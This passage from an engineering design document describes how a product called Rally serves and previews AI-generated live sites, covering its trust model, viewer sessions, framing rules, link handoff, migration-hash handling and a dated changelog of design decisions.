- R2 `PAYLOADS`: `artifact/<id>/v<n>/assets/<path>` and `…/manifest.json`.
  New manifests optionally carry a `socialPreview` descriptor; generated cards
  are ordinary versioned assets beneath that same prefix.

## Security and trust model

The trust surface is the point of this module, and
[`security.md`](security.md) owns the boundaries it sits on. In short: artifact
code is untrusted and capability-fenced (one injected binding, no network, no
secrets, no Rally bindings); artifact *data* is untrusted content with a trusted
container, since the rows were written by model code and page visitors while the
host class that reads them is Rally's and cannot be shadowed; and the serving
Worker's waistline is deliberately minimal. Artifact content is intentionally
public unless its active handler requires the trusted viewer header; error logs,
and inspection data require canonical resource access; publication and revision
retain their execution-scope authorization. A
compromise of the serving Worker exposes artifact content and viewer sessions
rather than workspace authority.

`viewer_sessions` is also readable and writable by an admitted operator through
the engineering MCP. It stores digests rather than cookie values, so nothing
there reconstructs a live session, but an operator who can write the table can
mint one; that is inside that console's stated authority rather than a boundary
this module holds, and [`engineering-mcp.md`](engineering-mcp.md) owns it.

### Native annotation picking

Comment mode in Rally's Mac preview installs the shared inspector into an
isolated JavaScript world and captures the selected element as a PNG crop. No
picker script is added to published site responses. Browser live-site previews
remain view-only. The authorized `GET /resources/:id/versions/:version/site-preview` route reopens frozen HTML assets without running
old site code; a missing or mismatched element shows its saved quote and image.
The selector and trust boundaries are owned by
[artifact annotations](artifact-annotations.md).

## Changelog

### 2026-10-22 — Preserve raw source data before building a site

**What changed:** The site skill loads `using-external-structured-data` for
raw-response transfer, source-row preservation and field-by-field validation in
initial builds and refreshes. The general procedure lives in that shared skill;
the site skill retains the site's data format and publication requirements.

**Why:** A calendar builder read complete Sheet values but manually reconstructed
37 posts, dropping populated copy and altering other fields while passing a
row-count assertion. Repeating the existing instruction to transform with code
would not explain how the returned records reach that code or what to validate.

**Consequences:** Agents must fix known field loss before publication. The
procedure does not claim a direct connector-to-file tool exists or that comparing
against copied inputs proves the copying was lossless.

### 2026-10-21 — Site refresh guidance preserves the publication conversation

**What changed:** The site skill requires both the original publishing
conversation and directory path, and explains Terminal activation and source
recovery for later runs.

**Why:** Path-only refresh instructions promised the existing URL even for
personal or workspace Sidekicks, whose publication namespace differs from the
thread that created the site. Following that guidance would create a second site.

**Considered and rejected:** Assuming a source import redirects publication;
it copies the files but leaves the run's publication target unchanged.

**Consequences:** A thread's refresh Sidekick must be owned by that thread.
Runs that cannot target the original conversation report the limitation rather
than publishing a replacement under a new identity.

Pull request: [#1394](https://github.com/juno-ai-labs/avalon/pull/1394).

### 2026-10-19 — Stored data lives in the artifact title-menu pop-out

**What changed:** Stateful sites contribute a Stored data menu level through
`DetailHeaderAction.menu`. The table picker, rows and CSV export mount only
when that level opens. The site preview stays mounted; the existing overlay
snapshot and native-view hiding behavior keeps the pop-out above it.

**Why:** Stored data belongs with the artifact's other menu sections. Replacing
the live page required tearing down and reopening a preview just to inspect its
rows, losing the original in-page state. A shared detail-menu primitive lets a
detail supply its own section without moving its data-fetching logic into the
panel host or duplicating it for detached windows.

**Consequences:** Closing the menu or going Back unmounts the table view and
restores the same preview without minting new access. Table selection and CSV
copy keep using the existing data APIs; authorization and row retrieval are
unchanged. Wide tables scroll inside the pop-out.



### 2026-10-18 — An overlay covers the page instead of blanking it

**What changed:** Before the rail preview collapses under a menu or dialog,
the renderer asks the main process for a still of the page
(`snapshotArtifactPreview`, `capturePage` as a JPEG data URL) and shows it in
the pane until the overlay closes and the view is back in place.

**Why:** Opening the artifact's own title menu (Rename, Copy link, Pin,
Versions) blanked the whole site behind it, which reads as the page having
crashed. A native view cannot sit under DOM, so the view still has to go; the
still is what keeps the page in sight. Shrinking the view around the overlay
was rejected: a popover in the middle of the pane leaves no rectangle to
shrink to.

**Consequences:** The still must be taken, and painted in the pane, before
the zero rectangle is sent (decode, `flushSync`, then wait a frame); a
`setState` alone lets the view collapse before React draws it. The renderer holds every update while the capture is in flight so a
mutation burst cannot collapse the view first. The overlay is invisible and
unclickable until that hide goes out, so the wait is bounded: past
`STILL_WAIT_MS` (150 ms, set by the team) the view hides with no still and the
pane is blank, as before. The still is placed at the rectangle the view held,
since a view clipped by the rail captures only its visible slice. The still is
a picture, not the page: nothing under an overlay is interactive, which it was
not before either. No still is taken while the view is still loading behind
"Opening…": the view is hidden then, and there is no site on screen to keep.

### 2026-10-18 — One "Opening…" per open, and no route read before the bootstrap

**What changed:** The rail preview's `WebContentsView` stays hidden
(`setVisible(false)`, at the pane's bounds) until `loadArtifactDocument` sees `dom-ready` on a document that is not
`/__rally/open`; the browser client's frame stays `visibility: hidden` until
its first `load`. The rail's "Opening…" now lasts until the preview reports it
is showing, rather than until access is minted. The serving Worker answers
`/__rally/open` before the D1 hostname-route read.

**Why:** Opening a site showed two loading looks in turn: Rally's own
"Opening…" in the pane, then the bootstrap's "Opening… One moment." in
system type on a `Canvas` background, painted over it by the view. The
bootstrap needed nothing from the route read, so every open paid a D1 round
trip before its first step, and the path told a known host from an unknown one
by 200 against 404.

**Considered and rejected:** Having Electron `POST` the code to the redeem
endpoint itself, skipping the bootstrap and one more round trip. That request
carries `Sec-Fetch-Site: none`, which the redeem fence refuses; widening the
fence is a security change and was not worth it for this. Making the bootstrap
page blank: the system browser and the pop-out still show it, and there it is
the only loading look.

**Consequences:** A site whose document never reaches `dom-ready` keeps the
rail on "Opening…" rather than showing a half-loaded page. The frame relies on
Chromium firing no `load` for the bootstrap, whose form `POST` replaces it
mid-parse; a check in a real Chromium confirmed it. Safari and Firefox were not
checked: where a browser does fire one, the frame shows the bootstrap for one
round trip, as before. The frame's `load` also waits for the site's images, so a
site with a slow image stays behind "Opening…" until they finish; a cross-origin
frame gives the parent no earlier signal without Rally script inside the site.
The view is hidden with `setVisible`, never by collapsing it to a zero
rectangle: the site's startup scripts run before `dom-ready`, and a 0×0
viewport left a canvas or chart sized once at load empty.

### 2026-10-15 — The skill checks layout by looking, and names the grid trap

**What changed:** The `building-live-sites` skill tells the model to write
the base stylesheet for a 400px viewport with `min-width` queries, to
screenshot the site at 400px and 1280px and look at it before announcing, and
names the hidden-grid-item trap. The panel's resize target and the even split
it opens at are recorded in [`desktop-layout.md`](desktop-layout.md#changelog).

**Why:** A generated market map rendered one word per line in the panel and
fine in a browser tab. The site's CSS hid its side rail below 900px with
`display: none` but kept `grid-template-columns: 0 1fr`, so the content fell
into the zero-wide column. Nothing in Rally was wrong. The skill already said
"narrow-first"; the model wrote desktop-first anyway and had no way to see the
result.

**Considered and rejected:** Screenshotting in the Worker with Browser
Rendering. It needs the site published first and a browser binding in each
region, where the sandbox already has the files.

**Consequences:** A public active site is checked at its published URL, which
the Trusted-only network baseline reaches through `*.rallyusercontent.com`
(#1246); a protected site gets the local layout check only. The check-and-fix
loop has no pass limit; each pass costs two screenshots and a model turn.

Shipped in [#1248](https://github.com/juno-ai-labs/avalon/pull/1248).

### 2026-10-15 — The rail preview converts CSS pixels through window zoom

**What changed:** The composited `WebContentsView` converts the renderer's
CSS-pixel rectangle through the window zoom factor before `setBounds`. The
embedded browser's `dimensions()` now calls the same `clampBounds` helper.

**Why:** A Rally window whose zoom was not 1 placed the native view short of
the pane: zoomed out, a gap on the left of the rail; zoomed in, overlap into
the transcript. Prompting the generated site did nothing because the page
was already flush in a normal tab.

**Consequences:** Desktop preview bounds must keep using the window zoom;
dropping the factor reintroduces the gap or the overlap.

### 2026-10-13 — A detail's header actions are data the header draws

**What changed:** A live site's Stored data, Open in a new window, Copy public
link and Open in browser are now `IconGroupAction`s the detail declares with
`useDetailHeaderActions`, and the panel header puts them in its `IconGroup`
beside Expand. They are round like Close and fold into "⋯" when the header is
crowded or at phone width. `IconGroupAction` gained `pressed`, for the Stored
data toggle (a check on its row once folded). Over a live site the header's
labels, "⋯" and Close included, open to the left of their buttons. The rail and
copy button now draw Tabler icons, like the header around them.

**Why:** The product owner flagged the four buttons as not following the
standard icon group, and asked for one icon set and for the "⋯" label to be
visible. They were portaled into the header as finished buttons,
so they kept the old rail's square look and spacing and could not fold.

**Considered and rejected:** Restyling the portaled buttons with CSS that keys
on where the slot sits. It fixed the look but not the fold, because
`IconGroup` can only fold actions it was given as data. For the labels, opening
them upward: at the top of the window Radix flips them back down, which is why
the old buttons' labels were hidden despite asking for `top`. Moving the page
aside while a label shows would make it jump on every hover.

**Consequences:** A detail's actions are limited to what `IconGroupAction`
carries: a label, an icon, a click, disabled and pressed. Which way labels open
is the host's call, set once for the header with `tooltipSide`. Copy
feedback is the label and glyph changing, with the live region rendered by the
detail. A detail must memoise the array it declares, since each new one
re-renders the host.

Shipped in #1219.

### 2026-10-03 — The browser client may frame an artifact

**What changed:** With `BROWSER_APP_ORIGIN` configured, artifact responses
allow that one origin in `frame-ancestors` and drop `X-Frame-Options`, and a
redemption inside a frame sets a partitioned `SameSite=None` viewer cookie. The
browser client, guest and member shells alike, previews live artifacts in a
sandboxed iframe.

**Why:** A browser has no main process to composite the preview, and the full
browser client PRD chose an inline preview over opening a tab (decision 6).

**Considered and rejected:** Keeping the new-tab pop-out only. A `frame-ancestors` allowlist of every Rally surface, when only the
browser client frames.

**Consequences:** This reverses, for one origin, the rule that nothing Rally
owns frames an artifact. The desktop still composites. Changing who may frame
an artifact is a change to `allowBrowserFraming` and this document together.

Shipped in #1082. Design: [Full browser client PRD](PRDs/2026-10-03_full-browser-client/prd.md).

### 2026-09-21 — Receipt drift cannot block a live page

**What changed:** ArtifactHostDO no longer needs a one-off compatible receipt.
Like every migrated object, it logs a structured warning when a stored migration
hash differs from the current implementation and continues initialization.

**Why:** The preceding repair restored the known comment-only fingerprint, but
an allowlist still made the next unexpected receipt difference a permanent user
outage. A migration-history diagnostic must not replace a usable live page with
an opaque 500.

**Considered and rejected:** Expanding the ArtifactHostDO hash allowlist as new
differences appear. That responds only after users are already blocked and makes
availability depend on classifying every past edit before deployment.

**Consequences:** The canonical artifact migration hashes stay pinned, and hash
drift retains both fingerprints in Workers Logs without blocking viewer-code
minting. Concrete SQL and schema failures still surface their own errors.

### 2026-09-21 — Restore the published artifact-host migration receipt

**What changed:** ArtifactHostDO migration 1 is restored byte-for-byte, and a
test pins the implementation hash of every released artifact-host migration.
The explanation of the retained visibility columns now lives outside the SQL
statement whose bytes form the durable receipt. The runner also accepts the one
exact, schema-equivalent receipt emitted by the comment-only deployment.

**Why:** The authorization-latency change updated only a SQL comment inside the
already-released migration. Comments are part of the migration statement and
therefore part of its persisted implementation hash. Every pre-existing
artifact host consequently refused initialization with
`artifact_host_schema_hash_mismatch:1`, so opening its page surfaced the API's
generic 500 instead of minting a viewer code.

**Considered and rejected:** Rewriting production receipts, adding a new
migration to bless the changed hash, or disabling hash checks. None changes the
schema, and each would weaken or obscure the guard whose job is to detect
edited history. Restoring the published bytes repairs existing objects; naming
only the known equivalent receipt avoids stranding an object first opened
during the faulty deployment.

**Consequences:** Released artifact-host migration statements, including their
embedded comments, cannot change without failing the focused test. The one
compatible receipt is pinned alongside them, and every other mismatch still
fails closed. Explanatory updates belong outside those statement strings;
actual schema changes append a new migration.

### 2026-09-21 — Open once and trust the admitted viewer session

**What changed:** The desktop uses the first artifact-open response for its
initial preview instead of discarding that response's code and minting a second
one. Pop-out, browser, and a preview reopened after showing stored data still
mint fresh single-use codes. Access state is bound to its resource so an in-place
Channel switch cannot combine the previous result with the next opener. The open
service overlaps its independent profile, placement, and authorization reads,
while preserving the concealed authorization response when an auxiliary read
fails. Once the resulting viewer session is
redeemed, artifact requests validate that durable session locally rather than
re-running canonical resource authorization for the document and every asset.

**Why:** Production showed one preview serially paying 1,075 ms and then 252 ms
for two complete opens before navigation began. The first response already held
the exact URL and artifact identity the preview needed. After redemption, the
zero-duration visibility cache made every page request cross the same D1 and
Durable Object authorization path again, even though admission had just proved
access and the revocation walk already removes sessions when membership or the
login session ends.

**Considered and rejected:** A guessed visibility TTL would retain periodic
polling and merely choose how often the redundant authority path runs. Keeping
ArtifactHostDO warm, adding another cache service, or merging WorkspaceDO RPCs
would optimize around work the serving path no longer needs.

**Consequences:** A viewer session assumes resource access until explicit
revocation or its fixed 24-hour expiry. Resource-scope changes that do not yet
publish an artifact-session revocation therefore do not interrupt an already
open page. New revocation cases must extend the existing durable walk rather
than putting canonical authorization back in front of artifact assets.

### 2026-09-18 — The supervisor becomes inspectable

**What changed:** `ArtifactHostDO` extends `InternallyInspectableDurableObject`
rather than `MigratableDurableObject`, which gives it the shared raw-SQL
`runInspectionSql` the engineering MCP reaches through the private regional
bridge.

**Why:** `error_log` exists to turn "the page is broken" into something
pasteable, and until now only a work-stream-authorized product surface could
read it. The one object whose whole job is holding the serving-side truth was
the one an operator could not open.

**Considered and rejected:** A narrow read-only inspection method on this class
instead of the shared base, to keep `viewer_sessions` out of reach. Rejected
because the console's purpose is repair and a second, weaker SQL surface would
have to be maintained beside the one four other classes already share —
`docs/durable-object-sqlite.md` keeps exactly one intentional raw-SQL exception,
and adding a second shape to it is how that stops being true.

**Consequences:** The operator console can read and write this object's
database, viewer session digests included. A future change must not add a
credential *value* to this object's storage on the assumption that only Rally
code reads it. That console reads the same object the guest-viewer authority
below fences for product callers; the two are separate authorities and neither
substitutes for the other.

### 2026-09-17 — Admit artifact viewers through shared resource authority

Child-only guests need access to sites attached to their shared conversation,
while workspace-public parent visibility must not expose unrelated artifacts.
Opening and inspecting a site now use canonical resource authorization, and the
supervisor repeats that decision for viewer sessions. A failed authority check
cannot reuse an earlier allowed answer; the serving Worker handles unavailable
identity through its existing anonymous-serving policy. Public site behavior is
unchanged. Keep session revocation and resource exposure as separate authorities.

The open/error/data HTTP routes admit guest workspace relationships before the
existing resource proof. Using the member-only accessor rejected the guest before
that proof could run. The browser uses the existing external-navigation adapter;
no native preview or new site authorization layer is required.

### 2026-09-13 — The revision loop's import half is connected

**What changed:** `import_resource` branches on `generated_site` and
materializes the version's tree — `readArtifactVersionFiles` for the bytes, a
staged directory for the upload, `materializeTreeCommand` to move it into place,
`importTreeFailure` for the exit codes. All four already existed in
`site-import.ts`; nothing called them. The output reports `fileCount` beside the
directory root in `filePath`, and an import that omits `destinationPath` is
refused with the site's own publish path rather than placed automatically.

**Why:** Rally could publish a site and never edit it again. The import fell
through to the single-file path, which fetches the one object at the resource's
`content_ref` — for a site that is the manifest, so a run asking for its own
source received the JSON index of it. The only revision left was to rewrite the
site from memory and republish, which keeps the URL but is not a revision of
what is being served: every unremembered detail silently disappears from the
next version. The tool description, `docs/agent-tools.md`, and the sites skill
had all specified this behavior; only the caller was missing.

**Considered and rejected:** *A separate `import_site` tool*, which would split
one question — put this resource in my workspace — across two names the model
has to choose between, when the existing schema already carries a directory
destination and a whole-tree `overwrite`. *Defaulting a site to
`.rally/resources/<id>/resource`*, which materializes a tree at a path that
cannot be republished, so the first thing the run learns about its site is a
path that mints a second one.

**What a future change has to respect:** the import is whole-tree replacement
and the publish path is the identity. Anything that changes where a site
materializes has to keep those two the same path, or a revision becomes a fork
with a live URL pointing at the version nobody edits. Two orderings inside it
are load-bearing, both found in review: a refusal is raised before the durable
`planned` row, because the next acquisition reads any import row that is not
`completed` as a revoked resource and replaces the sandbox — so a call that
changed nothing would cost the work stream its files; and the destination is
renamed aside rather than deleted, because `rm -rf` followed by a move that
fails had already destroyed the tree it was replacing, local edits included.

### 2026-09-12 — Inspect artifacts without creating navigation grants

**What changed:** Data and error reads now use a shared authorized resolver
instead of the complete navigation flow. The resolver retains the registry and
parent visibility checks, while navigation alone performs the profile read,
hostname migration, and single-use-code creation.

**Why:** Inspection was paying for those navigation-only operations despite
never redeeming the resulting code; this showed up on the artifact data and
error-read path as avoidable latency and unused viewer grants.

**Considered and rejected:** Skipping authorization or caching visibility was
rejected because each inspection must ask the current parent authority.

**Consequences:** Only `open` may create a viewer session or migrate a hostname.
Any future operation that needs either effect must go through `open`; inspection
callers must stay on `resolveAuthorized`. Expired viewer sessions are therefore
pruned on navigation rather than on inspection, which creates no sessions to
consume them.

Shipped in #731.

### 2026-09-12 — Overlap independent artifact asset writes

**What changed:** Asset writers now share the platform's six-connection ceiling,
stop claiming new assets after a failed write, and all settle before the manifest
is written.

**Why:** Serial R2 writes made multi-file publication pay every asset's network
latency in succession. Independent versioned asset keys do not need that
serialization.

**Considered and rejected:** Unbounded fan-out was rejected because it would
only queue inside the platform; early manifest publication was rejected because
it could expose an incomplete version.

**Consequences:** Six is a conservative whole-upload worker budget derived from
Cloudflare's per-invocation header-phase connection ceiling; it is neither a
hard transfer cap nor an account-wide limit. Any writer added to this path runs
beside five siblings and must settle before the assets-before-manifest barrier
can continue.

Shipped in #732.

### 2026-09-11 — A link in a site preview leaves through the person who clicked it

**What changed:** `confineToArtifactOrigin` now takes a link-handoff capability
and decides with it. An off-origin navigation is still never followed in place,
but under transient user activation it is handed to the default browser instead
of dropped — for both artifact surfaces, and for a `target="_blank"` link, which
leaves through the same gate without a second window being made — or, when it
points at the site's own origin, is shown in the surface already open. The
departure spends the activation, so one press admits one departure, and a
committed main-frame navigation drops it, so a press belongs to the document
that received it. Activation is
reconstructed per surface in the main process from Electron's `input-event`
stream, because nothing tells the main process about activation when a
navigation starts. Redirects and schemes outside the process's `http(s)` policy
are refused whatever the activation says, and spend nothing.

**Why:** The previous rule refused every off-origin navigation and handed it
nowhere, so a dashboard full of links was a page whose links did nothing at all
and the only recourse was to copy a URL out of a view that cannot be selected
from. That cost was accepted on the reasoning that the URL is model-composed and
handing it over makes Rally perform the exfiltration the egress fence exists to
prevent. That reasoning is still right about the *unattended* case and is what
the gate keeps: nothing reaches the browser without a press, so no timer, no
`onload`, and no cursor passing over the page gets there. It was never a
complete defence of the attended case — a person cannot read where a link points
before following it — and paying for a partial defence with every working link
was the wrong trade once sites became something people are meant to use.

**Considered and rejected:** Opening every off-origin navigation, which is the
simple reading of the request and removes the fence entirely: a page could then
send itself away with nobody present, which is the one case the gate is cheap to
keep closed. Treating activation as a five-second window of permission rather
than something a departure spends, which was the first shape written here and
was wrong in a way worth recording: `window.open` is called per invocation, so a
page answering one click with a loop would have put an unbounded number of URLs
— and so an unbounded amount of what it can see — through the system opener,
out of a press the person thought followed one link. Letting a press outlive its
document, which was the same mistake in the other direction: a same-origin
navigation does not spend the activation, so a click on an ordinary in-site link
stayed live into the next page, whose `onload` could spend it on a destination
nobody saw — an unattended handoff, which is the one thing the gate exists to
refuse. Dropping a same-origin `target="_blank"` link, which left an ordinary
class of in-site links doing visibly nothing; handing it to the browser instead
was rejected because a protected site opened there carries no viewer session and
answers 401. Accepting every representation of a press — `mouseUp`, `keyUp`,
`char`, `touchStart` — which armed on a press begun off this surface and on a
touch the person went on to cancel, making the boundary wider than the rule it
claims to reconstruct. A confirmation dialog showing the destination, which does close the
attended case — the only thing that does — but puts a modal in front of every
link on a dashboard; it remains the upgrade if a leak through a click ever
stops being theoretical. Honouring activation on `will-redirect`, which hands
the gate back to the page, since a model-authored handler answers requests on
this origin and can redirect a same-origin click anywhere.

**Consequences:** Deciding and spending are one step — `decideArtifactNavigation`
takes a `takeActivation` callback rather than a boolean — because a caller handed
a boolean can forget to consume it, and the failure that follows is silent and
unbounded. The five-second lifespan is transcribed from Chromium's
`blink::UserActivationState::kActivationLifespan` rather than chosen here, so
Rally and the page agree about when somebody is acting; a different span would
make them disagree and is not a free number to change. The gate is only as good
as the input stream feeding it — a new artifact surface that forgets
`artifactLinkHandoff` gets an activation that never fires, so every link on it
silently stops working, which the wiring test is there to catch. Anything that
widens this further has to say, as the invariant now does, what it closes and
what it does not.

### 2026-09-11 — The page's corner is the pane's, and the pane's host decides it

**What changed:** The renderer reads the corner it drew on the pane and sends it
with the presentation; the controller applies whatever it is given. The pane
rounds only its bottom pair, and only under `.resource-lightbox`, so a pane in
the plain rail states no corner and gets a square view. The main process holds
no radius of its own.

**Why:** The view reaches the bottom corners of the dialog holding it, and CSS
cannot round a native view: square there, the page squares off a frame that is
round, with the dialog's own curve and shadow visible around it as a notch.
Getting there took two wrong turns worth recording. First the view was rounded
uniformly to the lightbox's radius, which also rounded the top corners against
the header. Then it was left square on the reasoning that a square view covers
the curve rather than spilling past it, which is true and is exactly the defect.
The constant that survived those rounds was still wrong in a third way: it
assumed the lightbox, and `SiteResourceDetail` also renders in the plain
inspector rail, where the pane draws no corner and a rounded view would show
four notches against a square pane.

**Considered and rejected:** Keeping the radius in the main process and scoping
the stylesheet to both hosts, which leaves two answers to one question and
requires the main process to know which surface it is drawing into. A smaller
radius to shrink the top wedge: the bottom would then stop matching the dialog
and leave a sliver of frame showing. Extending the view's rectangle upward to
hide its top corners behind the header: the view composites *above* the DOM, so
it would cover the header rather than tuck under it.

**Consequences:** Electron still takes one radius for all four corners, so a
rounded pane shows a wedge of the dialog's surface where the page meets the
header; that is the closest the platform allows. Any new host for this detail
gets the corner it draws, with no main-process change. The stylesheet test pins
the dialog's radius to the pane's bottom pair, and asserts the main process
names no radius at all.

### 2026-09-10 — The page is the whole surface, and its controls are the header's

**What changed:** The detail no longer draws a panel switch, a kind line, or a
row of actions. Its four controls (stored data, pop out, copy public link, open
in browser) are icon buttons portalled into whatever header the host is already
drawing, through a slot the rail now offers any detail. Stored data is a toggle
that replaces the page rather than a peer of it, and the pane is full bleed: no
border, no corner, no gutter, flush to the lightbox's own edges. The error log
is gone from the client. What rounds the composited view moved twice more after
this; the entry above is the shipped answer.

**Why:** Everything Rally drew around the page was a second frame inside the
lightbox's, and everything it drew above the page competed with content the
model authored. A live artifact is the one resource whose detail *is* the thing
itself, so the chrome belongs where the surface already keeps chrome. Two
defects only visible in a window came out of it: an icon-only action is
unreadable without its tooltip, and every tooltip in this lightbox was opening
behind it at `z-index: 1000` against the lightbox's 1001, so they were present
in the DOM, findable by a test, and invisible to anyone hovering. The data
toggle also had no pressed state, because `.icon-button` had never had one.

**Considered and rejected:** Hoisting the detail's state into the rail so the
rail could draw the buttons itself, which spreads one detail's logic across two
components and grows the rail by a branch per kind of resource. The slot gives
the rail one capability and no knowledge of any detail. Also rejected: keeping
the error log behind the new toggle, which is the panel-among-panels shape this
change exists to remove.

**Consequences:** **A site's thrown errors are no longer visible anywhere in the
client.** The supervisor still records them and `GET` still serves them; nothing
reads it. Bringing them back should not restore a permanent tab: the surface
that fits is one that appears only when the log is non-empty. A detail that
wants header actions must be rendered inside `DetailHeaderActionsHost`, and a
host that forgets the slot silently gets no actions rather than a fallback
layout. The view's corner is now pinned to the lightbox's radius, so restyling
that dialog means moving the constant with it.

### 2026-09-10 — The site detail wears the shell's design, and the view is rounded

**What changed and why:** The detail drew the pre-rewrite look because it
renders through a portal, where none of the shell's scoped rules apply: a tab
strip of outlined buttons, a bordered card per thrown error, and its own copy of
the resource title under the header that already carried it. It now uses the two
unscoped grouping primitive (`InsetSurface`), carries no
title of its own, and puts Pop out, Copy public link, and Open in browser in one
chrome row beside the panel switch instead of a row of buttons under the page,
where they read as part of the artifact rather than as Rally's. The pane takes
the whole lightbox body rather than ending halfway down it.

`ArtifactViewHandle` gained `setBorderRadius`, applied once at creation. A
`WebContentsView` composites above the DOM and CSS cannot clip it, so the
rounded pane was drawing its own corners around a square page. The corner is set
on the view rather than sent with the bounds because bounds are recomputed on
every scroll frame and the corner is a property of the surface, not of a layout.
Where the number itself comes from moved after this; the 2026-09-11 entry above
is the shipped answer.

**Consequences:** The number lives in two places that cannot import each other,
the main process and a design token, so `app.css.node.test.ts` pins them
together; moving one alone fails there rather than showing up as a hairline
around a page. The panel switch is a group of toggles, not a tab list, so a test
that queries it by `role="tab"` is querying something this detail no longer
claims to be.

### 2026-09-04 — Host site details in the resource lightbox

**What changed and why:** Parking the right sidebar must not send generated-site
manifests through file conversion. Citation and artifact clicks now open the
same dedicated SiteResourceDetail in a lightbox, preserving the native isolated
viewer, fresh access codes, data, logs, and pop-out behavior. File conversion is
not a fallback for a site. Nested dialogs/menus hide the native preview; closing
them restores its clipped viewport. Route changes tear it down.

**Consequences:** The viewer still owns no shell rail. Earlier references below
to the rail describe its original host, not a current navigation entry point.

### 2026-09-02 — Preview teardown asks whether its surfaces still exist

**What changed:** `ArtifactViewHandle` and `ArtifactHostWindow` gained a
`destroyed()` predicate, and `ArtifactPreviewController` consults it before
detaching, closing, laying out, or presenting.

**Why:** Quitting with an artifact open in the rail crashed the app instead of
quitting it. `electron-updater` closes every window to install; the window's
`closed` handler then tore the preview down, and reading `contentView` off a
window Electron had already destroyed threw `TypeError: Object has been
destroyed` from inside an event handler — which the main process reports as an
uncaught exception dialog. The teardown was correct about *what* to clean up and
wrong about *when* it was still possible.

**Considered and rejected:** Tearing down on `close` instead of `closed`, which
would run while the window still exists — but `close` is cancellable and can
fire more than once, so the preview would be destroyed under a person who then
kept the window. Wrapping the teardown in `try`/`catch` would hide the same
class of ordering bug everywhere else it occurs. Guarding inside the Electron
adapter in `index.ts` would have worked and been untestable: this module holds
no `electron` import precisely so its decisions can be unit tested, and *when a
surface may be touched* is a decision.

**Also:** `present()` discards a view whose contents closed themselves before
deciding whether to reuse it. Reuse was keyed on the artifact ID alone, so a
page that called `window.close()` left a dead handle that the next presentation
of the same artifact would keep — compositing nothing while reporting success,
which the rail reads as a live preview and so renders no fallback over the blank
pane. Found by review.

**On the tests:** a disjunctive lifetime check reads as covered while half of
it is dead, so each half is falsified separately where it can be. In `destroy()`
both halves are load-bearing — they gate different actions on objects that die
independently — and each has its own test. In `applyBounds()` only the view half
is falsifiable: Electron destroys a window's views with it, so a destroyed
window implies a destroyed view and the window half can never be the one that
returns. It is kept as the statement of what `contentSize()` needs, not as
tested behaviour. Both gaps came out of review; the first round shipped one
combined test and claimed more than it proved.

**Consequences:** The lifecycle is now part of the two interfaces, so any future
host or view implementation has to answer for it. A destroyed window is asked to
detach nothing, because destroying it already destroyed its children; the view
is asked separately, so one that closed itself is still detached from the live
window holding it. Closing the preview over IPC also stops dropping the
controller from the per-window map, which was adding a second `closed` listener
to the same window on every subsequent presentation.

### 2026-09-02 — A cancelled detail cannot resurrect its preview

**What changed:** The live-site detail now checks its ownership again after a
navigation access mint settles and before asking Electron to present the native
preview. It also carries the artifact ID and URL from the same mint into preview
and pop-out requests. Regression tests hold a mint across unmount to prove no
late presentation and reject an identity/URL pair from different mints.

**Why:** Switching work streams closes the preview while the old detail unmounts,
but minting the preview's single-use access URL is asynchronous. When that mint
finished after cleanup, the continuation still called the main process and
created the old stream's site view with no mounted component left to close it.

**Considered and rejected:** Closing every preview a second time after minting
would still let stale artifact content appear briefly and could close a newer
detail's valid preview. The cancelled owner instead never presents.

**Consequences:** Every asynchronous step before native presentation must keep
the detail's cancellation fence, and every privileged navigation request must
carry identity and URL from one access response. Work-stream switches can no
longer leave an old site composited over the newly selected feed or rely on
React effect timing to preserve the artifact storage boundary.

### 2026-09-02 — Published sites get complete social previews

**What changed:** Site publication now normalizes a title, description, and
local preview image into the version manifest, generating a deterministic
1200×630 Rally card when the page did not supply usable artwork. The serving
Worker injects canonical Open Graph and Twitter/X metadata into successful
current HTML and gives the preview image URL an artifact-version query. The
site-building skill now tells the model to author a specific title,
description, and `social-preview.png` rather than relying on the fallback.

**Why:** Making the stable URL publicly readable removed the authentication
failure that blocked crawlers, but public HTML alone produces a weak or empty
unfurl when the generated page omitted metadata or a share image. The publish
boundary already has every file and a bounded input, so it is the one place
that can fill the contract once instead of making every crawler request derive
it again.

**Considered and rejected:** A dedicated public `__rally` preview route would
make an immutable-looking image URL, but it would run before an active site's
model-authored viewer guard and could disclose artwork from a protected site.
Buffering active responses would make arbitrary handler output a memory cost;
they use the runtime's streaming HTML transform instead. Always using the
generated Rally card would be simpler, but would discard the subject and visual
language the author still has in context.

**Consequences:** Newly published versions unfurl without requiring every model
to remember the protocol, while authored metadata wins in the served head.
Existing manifests stay valid because `socialPreview` is optional; an unchanged
republish detects a legacy manifest and deliberately mints the preview-bearing
version instead of taking the ordinary content-deduplication return. Protected
sites still return their guard response to anonymous crawlers and keep their
image behind the same handler. A future change must not move the image onto a
platform route unless that route can prove the same per-site access decision.

### 2026-09-02 — Sites become public by default; protection becomes active code

**What changed:** Artifact `GET` and `HEAD` requests now serve the current site
without a Rally session. Cross-site and metadata-free reads are forced
anonymous even if they carry a cookie; same-origin requests and top-level
navigations receive trusted viewer headers only after a valid Rally session is
checked. The site-building guidance now says that a protected site must be
active and reject requests without `x-rally-viewer-id` before routing or serving
assets. Anonymous unsafe methods remain session-gated, public responses opt out
of search indexing, and the rail action names what it copies: **Copy public
link**.

**Why:** The stable URL is a product output intended to open in browsers and
unfurl in crawlers. Requiring every reader to enter through Rally made copied
links return 401/403 and made social previews impossible. A static page cannot
make an authorization decision, so claiming platform privacy for every site
also prevented the author from choosing the public behavior the URL implied.

**Considered and rejected:** Making every request anonymous would discard useful
member attribution for polls and sign-ups opened inside Rally. Trusting a
cookie on arbitrary cross-site reads would let a sibling artifact exercise a
handler as the victim because all artifact hosts are same-site. Keeping static
sites session-gated while publicizing active sites would invert the natural
default and leave crawlers unable to read the most common site type.

**Consequences:** Existing static and active sites are publicly readable. A
protected site is an explicit active application boundary, not an unguessable
URL: its first operation checks the Rally-injected viewer id on every route.
Unsafe cross-origin requests remain refused, public reads never receive a
viewer identity, and all responses retain the platform CSP and security
headers. Historical-version mounts remain session-gated because an old active
version cannot run its protection guard, and a stateless active site returns
503 rather than exposing assets when its handler cannot run. The readable
hostname is not treated as secrecy; its finite vocabulary is accepted because
the content is public, while `noindex` avoids turning sharing into search
discovery.

### 2026-09-02 — Pop-outs keep artifact content below the window controls

**What changed:** The desktop artifact pop-out now uses Electron's compact
native title bar instead of extending model-authored content into a hidden inset
title area.

**Why:** Artifact pages own their complete document and have no Rally layout
contract. A page whose navigation begins at the top edge therefore rendered
under the macOS traffic lights, obscuring both the site's title and the window
controls. Reserving the space in the window is the only fix that applies to
every existing and future artifact without rewriting its content.

